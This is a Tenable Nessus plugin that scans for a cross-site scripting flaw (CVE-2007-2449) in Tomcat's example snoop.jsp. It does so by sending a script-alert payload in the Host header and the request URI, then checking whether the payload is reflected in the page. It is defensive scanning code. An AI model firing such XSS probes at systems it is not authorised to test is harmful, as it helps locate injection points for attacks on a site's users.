#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25525);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2007-2449");
  script_bugtraq_id(24476);
  script_xref(name:"OSVDB", value:"36080");

  script_name(english:"Tomcat snoop.jsp URI XSS");
  script_summary(english:"Checks for an XSS flaw in Tomcat's snoop.jsp");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a JSP application that is vulnerable to
a cross-site scripting attack." );
 script_set_attribute(attribute:"description", value:
"The remote web server includes an example JSP application,
'snoop.jsp', that fails to sanitize user-supplied input before using
it to generate dynamic content.  An unauthenticated remote attacker
may be able to leverage this issue to inject arbitrary HTML or script
code into a user's browser to be executed within the security context
of the affected site." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2007-06/0183.html" );
 script_set_attribute(attribute:"solution", value:
"Undeploy the Tomcat examples web application." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default: 8080);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# Unless we're paranoid, make sure the banner looks like Tomcat.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || "Server: Apache-Coyote" >!< banner) exit(0);
}


# Send a request to exploit the flaw.
xss = raw_string("<script>alert('", SCRIPT_NAME, "')</script>");
exploit = string(";", xss, "test.jsp");
foreach dir (make_list("/examples/jsp", "/jsp-examples"))
{
  if ("/examples/jsp" == dir)
  {
    w = http_send_recv3(method:"GET", item:string(dir, "/snp/snoop.jsp"), 
      port:port, add_headers: make_array("Host", xss));
  }
  else
  {
    w = http_send_recv3(method: "GET", 
      item:string(dir, "/snp/snoop.jsp", exploit), 
      port:port  
    );
  }
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # There's a problem if our exploit appears in the request URI.
  if (
    ("/examples/jsp" == dir && string("Server name: ", xss) >< res) ||
    (string("Request URI: /jsp-examples/snp/snoop.jsp", exploit) >< res)
  ) 
  {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
